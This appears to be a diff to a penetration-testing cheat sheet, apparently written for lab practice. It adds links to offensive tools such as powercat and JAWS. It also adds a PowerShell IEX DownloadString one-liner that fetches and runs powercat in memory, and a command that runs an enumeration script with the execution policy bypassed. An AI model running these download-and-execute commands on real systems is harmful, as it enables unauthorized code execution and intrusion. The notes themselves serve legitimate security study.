@@ -18,12 +18,22 @@ https://github.com/rasta-mouse/AmsiScanBufferBypass
 https://github.com/cobbr/InsecurePowerShell  
 https://github.com/BC-SECURITY/Empire # Or any other C2 framework but this one was fun to use from THM   
 https://github.com/BC-SECURITY/Starkiller  
+https://github.com/besimorhino/powercat
+```powershell
+
+IEX (New-Object System.Net.Webclient).DownloadString('https://raw.githubusercontent.com/besimorhino/powercat/master/powercat.ps1')
+```
+https://github.com/411Hall/JAWS
+```powershell
+powershell.exe -ExecutionPolicy Bypass -File .\jaws-enum.ps1 -OutputFileName Jaws-Enum.txt
+```
+
 
 ### Arch before making shells!
 Careful of x64,x32,x86_64 etc funtimes with windows!
 
 ### Sysinternals is your friend
-
+[download-index](https://docs.microsoft.com/en-us/sysinternals/downloads/)
 
 ###  msfvenom shells 
 
